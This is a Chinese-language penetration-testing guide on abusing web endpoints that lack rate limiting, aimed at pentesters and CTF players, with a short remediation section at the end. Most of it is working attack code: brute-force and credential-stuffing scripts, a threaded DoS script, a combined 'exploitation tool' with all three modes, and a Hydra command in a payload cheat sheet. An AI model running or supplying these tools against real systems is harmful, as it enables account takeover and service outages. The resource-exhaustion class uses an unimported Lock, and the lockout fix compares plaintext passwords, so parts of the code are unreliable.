# 无速率限制滥用攻击

## 1. 概述

### 1.1 漏洞原理

当 Web 应用的认证接口、敏感操作接口或资源消耗型接口未实施速率限制（Rate Limiting）时，攻击者可以自动化执行大量请求，实现：
- 暴力破解用户凭证
- 凭证填充攻击
- 验证码绕过
- 拒绝服务攻击（DoS）
- 资源耗尽攻击

**核心漏洞模式：**
```python
# 危险模式 - 无任何速率限制
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    # 无尝试次数限制
    # 无 IP 封禁机制
    # 无 CAPTCHA 验证
    user = User.query.filter_by(username=username, password=password).first()
```

### 1.2 适用范围

- Flask/Django/FastAPI 等 Web 应用
- 登录/认证接口
- 密码重置接口
- 注册接口
- 验证码验证接口
- API 端点
- 资源消耗型操作（如触发 PhantomJS 渲染）

### 1.3 读者对象

- 渗透测试工程师
- 安全审计人员
- CTF 参赛选手

---

## 2. 漏洞探测方法

### 2.1 速率限制检测

**快速检测方法：**
```bash
#!/bin/bash
# 发送 50 个快速请求检测速率限制

TARGET="http://localhost:37579/login"

echo "[*] Sending 50 rapid login attempts..."

for i in {1..50}; do
    response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET" \
        -d "username=test&password=wrongpass$i")
    
    if [ "$response" == "429" ]; then
        echo "[!] Rate limiting detected at attempt $i (HTTP 429)"
        exit 0
    fi
    
    echo -ne "Attempt $i: HTTP $response\r"
done

echo ""
echo "[✗] No rate limiting detected after 50 attempts"
```

**检测指标：**
- HTTP 429 Too Many Requests 响应
- 请求延迟突然增加
- IP 被封禁（HTTP 403/503）
- CAPTCHA 挑战出现
- 账户锁定提示

### 2.2 自动化检测脚本

```python
#!/usr/bin/env python3
"""
速率限制自动化检测工具
"""

import requests
import time
from statistics import mean, stdev

class RateLimitDetector:
    def __init__(self, target_url, method='POST'):
        self.target = target_url
        self.method = method
        self.session = requests.Session()
        
        self.response_times = []
        self.status_codes = []
        self.rate_limited = False
    
    def send_request(self, payload=None):
        """发送单个请求"""
        start_time = time.time()
        
        try:
            if self.method == 'POST':
                response = self.session.post(self.target, data=payload or {})
            else:
                response = self.session.get(self.target, params=payload or {})
            
            elapsed = time.time() - start_time
            
            self.response_times.append(elapsed)
            self.status_codes.append(response.status_code)
            
            # 检测速率限制
            if response.status_code == 429:
                self.rate_limited = True
                print(f"\n[!] Rate limiting detected! (HTTP 429 at request {len(self.status_codes)})")
                return True
            
            # 检测延迟激增
            if len(self.response_times) >= 5:
                recent_avg = mean(self.response_times[-5:])
                if recent_avg > 2.0:  # 平均响应时间超过 2 秒
                    print(f"\n[!] Possible rate limiting! (Avg response time: {recent_avg:.2f}s)")
                    self.rate_limited = True
                    return True
            
            return False
        
        except requests.exceptions.RequestException as e:
            print(f"\n[!] Request failed: {e}")
            return True
    
    def detect(self, num_requests=100, delay=0):
        """执行速率限制检测"""
        print(f"[*] Starting rate limit detection...")
        print(f"[*] Target: {self.target}")
        print(f"[*] Requests: {num_requests}")
        print(f"[*] Delay between requests: {delay}s\n")
        
        for i in range(num_requests):
            if self.send_request({'username': f'test{i}', 'password': 'wrongpass'}):
                break
            
            if (i + 1) % 10 == 0:
                avg_time = mean(self.response_times[-10:]) if self.response_times else 0
                print(f"[*] Progress: {i+1}/{num_requests} (Avg: {avg_time:.3f}s)")
            
            if delay > 0:
                time.sleep(delay)
        
        # 输出统计
        self.print_statistics()
        
        return not self.rate_limited
    
    def print_statistics(self):
        """输出统计信息"""
        print("\n" + "="*50)
        print("RATE LIMIT DETECTION RESULTS")
        print("="*50)
        
        print(f"Total requests sent: {len(self.status_codes)}")
        print(f"Unique status codes: {set(self.status_codes)}")
        
        if self.response_times:
            print(f"Average response time: {mean(self.response_times):.3f}s")
            if len(self.response_times) > 1:
                print(f"Response time std dev: {stdev(self.response_times):.3f}s")
                print(f"Min response time: {min(self.response_times):.3f}s")
                print(f"Max response time: {max(self.response_times):.3f}s")
        
        # 状态码分布
        print("\nStatus code distribution:")
        for code in set(self.status_codes):
            count = self.status_codes.count(code)
            percentage = (count / len(self.status_codes)) * 100
            print(f"  HTTP {code}: {count} ({percentage:.1f}%)")
        
        if not self.rate_limited:
            print("\n[✗] NO RATE LIMITING DETECTED")
            print("[!] Target is vulnerable to brute force attacks")
        else:
            print("\n[✓] Rate limiting is in place")

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url> [num_requests]")
        sys.exit(1)
    
    target = sys.argv[1]
    num_requests = int(sys.argv[2]) if len(sys.argv) > 2 else 100
    
    detector = RateLimitDetector(target)
    detector.detect(num_requests=num_requests)
```

### 2.3 并发请求测试

```python
#!/usr/bin/env python3
"""
并发请求测试 - 检测并发速率限制
"""

import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

def send_request(session, url, request_id):
    """发送单个请求"""
    start = time.time()
    try:
        response = session.post(url, data={'username': f'test{request_id}', 'password': 'wrong'})
        elapsed = time.time() - start
        return request_id, response.status_code, elapsed
    except Exception as e:
        return request_id, None, str(e)

def concurrent_test(target_url, num_workers=10, total_requests=100):
    """并发请求测试"""
    print(f"[*] Concurrent rate limit test")
    print(f"[*] Workers: {num_workers}, Total requests: {total_requests}\n")
    
    session = requests.Session()
    results = []
    
    with ThreadPoolExecutor(max_workers=num_workers) as executor:
        futures = [
            executor.submit(send_request, session, target_url, i)
            for i in range(total_requests)
        ]
        
        for future in as_completed(futures):
            request_id, status_code, elapsed = future.result()
            results.append((request_id, status_code, elapsed))
            
            if status_code == 429:
                print(f"[!] Rate limiting detected at request {request_id}")
    
    # 统计
    status_codes = [r[1] for r in results if r[1]]
    print(f"\nStatus codes: {set(status_codes)}")
    print(f"HTTP 429 count: {status_codes.count(429)}")

if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:37579/login"
    concurrent_test(target)
```

---

## 3. 漏洞利用方法

### 3.1 暴力破解攻击

**基础暴力破解：**
```python
#!/usr/bin/env python3
"""
暴力破解攻击脚本
"""

import requests
from threading import Lock

class BruteForceAttacker:
    def __init__(self, target_url, username_list, password_list):
        self.target = target_url
        self.usernames = username_list
        self.passwords = password_list
        self.session = requests.Session()
        self.found_credentials = []
        self.lock = Lock()
    
    def attack(self, delay=0):
        """执行暴力破解"""
        print(f"[*] Starting brute force attack...")
        print(f"[*] {len(self.usernames)} usernames × {len(self.passwords)} passwords")
        print(f"[*] Total combinations: {len(self.usernames) * len(self.passwords)}\n")
        
        total_attempts = 0
        successful = False
        
        for username in self.usernames:
            if successful:
                break
            
            for password in self.passwords:
                total_attempts += 1
                
                try:
                    response = self.session.post(
                        self.target,
                        data={'username': username, 'password': password},
                        allow_redirects=False
                    )
                    
                    # 检测登录成功
                    if self.is_successful_login(response):
                        with self.lock:
                            self.found_credentials.append((username, password))
                            print(f"\n[✓] SUCCESS: {username}:{password}")
                            successful = True
                            break
                    
                    # 检测速率限制
                    if response.status_code == 429:
                        print(f"\n[!] Rate limiting detected at attempt {total_attempts}")
                        return
                    
                    if (total_attempts % 100) == 0:
                        print(f"[*] Attempt {total_attempts}...")
                    
                    if delay > 0:
                        import time
                        time.sleep(delay)
                
                except requests.exceptions.RequestException as e:
                    print(f"[!] Request failed: {e}")
                    return
        
        print(f"\n[*] Attack completed. Total attempts: {total_attempts}")
        
        if not self.found_credentials:
            print("[✗] No valid credentials found")
        else:
            print(f"[✓] Found {len(self.found_credentials)} credential pair(s)")
    
    def is_successful_login(self, response):
        """检测登录成功"""
        # 检查重定向
        if response.status_code == 302:
            location = response.headers.get('Location', '')
            if any(p in location.lower() for p in ['home', 'dashboard', 'profile']):
                return True
        
        # 检查响应内容
        content = response.text.lower()
        success_indicators = ['welcome', 'dashboard', 'logout', 'success']
        if any(indicator in content for indicator in success_indicators):
            return True
        
        # 检查 Cookie
        if 'session' in self.session.cookies:
            return True
        
        return False

if __name__ == "__main__":
    # 示例用法
    usernames = ['test', 'admin', 'root', 'user']
    passwords = ['test', 'admin', 'password', '123456', 'root', '123456789']
    
    attacker = BruteForceAttacker(
        "http://localhost:37579/login",
        usernames,
        passwords
    )
    attacker.attack()
```

### 3.2 凭证填充攻击

```python
#!/usr/bin/env python3
"""
凭证填充攻击 - 使用泄露凭证
"""

import requests
import csv

# 常见泄露凭证（来自 RockYou、Collection #1 等）
COMMON_PASSWORDS = [
    '123456', 'password', '123456789', '12345678', '12345',
    'qwerty', 'abc123', 'password1', '111111', 'letmein',
    'welcome', 'admin', 'monkey', 'dragon', 'master',
    'login', 'passw0rd', 'shadow', 'sunshine', 'princess'
]

def credential_stuffing(target_url, username, passwords=COMMON_PASSWORDS):
    """凭证填充攻击"""
    print(f"[*] Starting credential stuffing for user: {username}")
    
    session = requests.Session()
    
    for i, password in enumerate(passwords):
        try:
            response = session.post(
                target_url,
                data={'username': username, 'password': password},
                allow_redirects=False
            )
            
            if response.status_code == 302:
                print(f"[✓] SUCCESS: {username}:{password}")
                return username, password
            
            if response.status_code == 429:
                print(f"[!] Rate limited after {i} attempts")
                return None, None
            
            if (i + 1) % 10 == 0:
                print(f"[*] Tested {i+1} passwords...")
        
        except Exception as e:
            print(f"[!] Error: {e}")
            return None, None
    
    print("[✗] No valid password found")
    return None, None

if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:37579/login"
    username = sys.argv[2] if len(sys.argv) > 2 else "test"
    
    credential_stuffing(target, username)
```

### 3.3 高资源消耗攻击

**针对 PhantomJS 等渲染引擎：**
```python
#!/usr/bin/env python3
"""
高资源消耗攻击 - 无速率限制的 DoS
"""

import requests
from concurrent.futures import ThreadPoolExecutor
import time

class ResourceExhaustionAttack:
    def __init__(self, target_url, num_workers=20):
        self.target = target_url
        self.num_workers = num_workers
        self.requests_sent = 0
        self.errors = 0
        self.lock = Lock()
    
    def send_request(self, worker_id):
        """发送单个请求"""
        try:
            session = requests.Session()
            response = session.post(
                self.target,
                data={'username': f'attacker{worker_id}', 'password': 'test'},
                timeout=30
            )
            
            with self.lock:
                self.requests_sent += 1
            
            return response.status_code
        
        except Exception as e:
            with self.lock:
                self.errors += 1
            return None
    
    def attack(self, duration_seconds=60):
        """执行资源耗尽攻击"""
        print(f"[*] Starting resource exhaustion attack...")
        print(f"[*] Target: {self.target}")
        print(f"[*] Workers: {self.num_workers}")
        print(f"[*] Duration: {duration_seconds}s\n")
        
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=self.num_workers) as executor:
            while time.time() - start_time < duration_seconds:
                futures = [
                    executor.submit(self.send_request, i)
                    for i in range(self.num_workers)
                ]
                
                # 等待所有请求完成
                for future in futures:
                    future.result()
                
                elapsed = time.time() - start_time
                print(f"[*] Progress: {self.requests_sent} requests in {elapsed:.1f}s "
                      f"({self.requests_sent/elapsed:.1f} req/s)")
        
        print(f"\n[✓] Attack completed")
        print(f"    Total requests: {self.requests_sent}")
        print(f"    Errors: {self.errors}")
        print(f"    Average RPS: {self.requests_sent/duration_seconds:.1f}")

if __name__ == "__main__":
    target = "http://localhost:37579/login"
    attack = ResourceExhaustionAttack(target, num_workers=20)
    attack.attack(duration_seconds=30)
```

---

## 4. 自动化利用工具

### 4.1 综合攻击工具

```python
#!/usr/bin/env python3
"""
无速率限制综合攻击工具
支持：暴力破解、凭证填充、DoS
"""

import requests
import argparse
from concurrent.futures import ThreadPoolExecutor
import time

class NoRateLimitExploiter:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
    
    def bruteforce(self, usernames, passwords, threads=1):
        """多线程暴力破解"""
        print(f"[*] Starting brute force with {threads} threads...")
        
        found = []
        lock = __import__('threading').Lock()
        
        def try_login(username, password):
            try:
                sess = requests.Session()
                response = sess.post(
                    self.target,
                    data={'username': username, 'password': password},
                    allow_redirects=False,
                    timeout=5
                )
                
                if response.status_code == 302:
                    with lock:
                        found.append((username, password))
                        print(f"\n[✓] FOUND: {username}:{password}")
            except:
                pass
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for username in usernames:
                for password in passwords:
                    executor.submit(try_login, username, password)
        
        return found
    
    def credential_stuffing(self, username, password_file, threads=5):
        """凭证填充"""
        print(f"[*] Starting credential stuffing...")
        
        with open(password_file, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
        
        found = []
        
        def try_password(password):
            try:
                sess = requests.Session()
                response = sess.post(
                    self.target,
                    data={'username': username, 'password': password},
                    allow_redirects=False,
                    timeout=5
                )
                
                if response.status_code == 302:
                    print(f"\n[✓] FOUND: {username}:{password}")
                    found.append(password)
            except:
                pass
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            list(executor.map(try_password, passwords))
        
        return found
    
    def dos(self, duration=30, threads=20):
        """拒绝服务攻击"""
        print(f"[*] Starting DoS attack ({duration}s, {threads} threads)...")
        
        count = [0]
        stop = [False]
        lock = __import__('threading').Lock()
        
        def attack():
            while not stop[0]:
                try:
                    requests.post(self.target, data={'username': 'dos', 'password': 'dos'}, timeout=2)
                    with lock:
                        count[0] += 1
                except:
                    pass
        
        threads_list = [__import__('threading').Thread(target=attack) for _ in range(threads)]
        for t in threads_list:
            t.daemon = True
            t.start()
        
        time.sleep(duration)
        stop[0] = True
        
        for t in threads_list:
            t.join()
        
        print(f"[✓] DoS completed: {count[0]} requests in {duration}s")
        return count[0]

def main():
    parser = argparse.ArgumentParser(description='No Rate Limit Exploitation Tool')
    parser.add_argument('target', help='Target URL')
    parser.add_argument('--bruteforce', action='store_true', help='Brute force attack')
    parser.add_argument('--credential-stuffing', help='Credential stuffing (username)')
    parser.add_argument('--passwords', help='Password list file')
    parser.add_argument('--dos', action='store_true', help='DoS attack')
    parser.add_argument('--duration', type=int, default=30, help='DoS duration in seconds')
    parser.add_argument('--threads', type=int, default=5, help='Number of threads')
    
    args = parser.parse_args()
    
    exploiter = NoRateLimitExploiter(args.target)
    
    if args.bruteforce:
        usernames = ['test', 'admin', 'root', 'user']
        passwords = ['test', 'admin', 'password', '123456', 'root']
        exploiter.bruteforce(usernames, passwords, threads=args.threads)
    
    elif args.credential_stuffing:
        if not args.passwords:
            print("[!] Password file required")
            return
        exploiter.credential_stuffing(args.credential_stuffing, args.passwords, threads=args.threads)
    
    elif args.dos:
        exploiter.dos(duration=args.duration, threads=args.threads)

if __name__ == "__main__":
    main()
```

---

## 5. 常见 Payload 速查表

| 目标 | Payload/命令 | 说明 |
|------|-------------|------|
| 检测速率限制 | `for i in {1..50}; do curl -s -o /dev/null -w "%{http_code}" http://target/login; done` | 快速发送 50 个请求 |
| 暴力破解 | `python3 bruteforce.py http://target/login` | 暴力破解登录 |
| 凭证填充 | `python3 credential_stuffing.py http://target/login test` | 凭证填充攻击 |
| 并发测试 | `python3 concurrent_test.py http://target/login` | 并发请求测试 |
| DoS 攻击 | `python3 dos_attack.py http://target/login --duration 60` | 资源耗尽攻击 |
| 单用户测试 | `hydra -l admin -P rockyou.txt http://target/post` | 使用 Hydra 暴力破解 |

---

## 6. 修复建议

### 6.1 实施速率限制

```python
# Flask-Limiter 示例
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    pass
```

### 6.2 添加 CAPTCHA

```python
# 添加 reCAPTCHA
from flask_wtf import FlaskForm
from flask_wtf.recaptcha import RecaptchaField

class LoginForm(FlaskForm):
    username = StringField('Username')
    password = PasswordField('Password')
    recaptcha = RecaptchaField()
```

### 6.3 账户锁定机制

```python
# 实现账户锁定
from datetime import datetime, timedelta

class User(db.Model):
    failed_attempts = db.Column(db.Integer, default=0)
    locked_until = db.Column(db.DateTime)

def login(username, password):
    user = User.query.filter_by(username=username).first()
    
    if user and user.locked_until and user.locked_until > datetime.utcnow():
        return "Account locked"
    
    if user and user.password == password:
        user.failed_attempts = 0
        return "Success"
    else:
        user.failed_attempts += 1
        if user.failed_attempts >= 5:
            user.locked_until = datetime.utcnow() + timedelta(minutes=15)
        return "Invalid credentials"
```

---

## 7. 参考资源

- [OWASP Rate Limiting](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html)
- [Flask-Limiter Documentation](https://flask-limiter.readthedocs.io/)
- [Hydra Brute Force Tool](https://github.com/vanhauser-thc/thc-hydra)
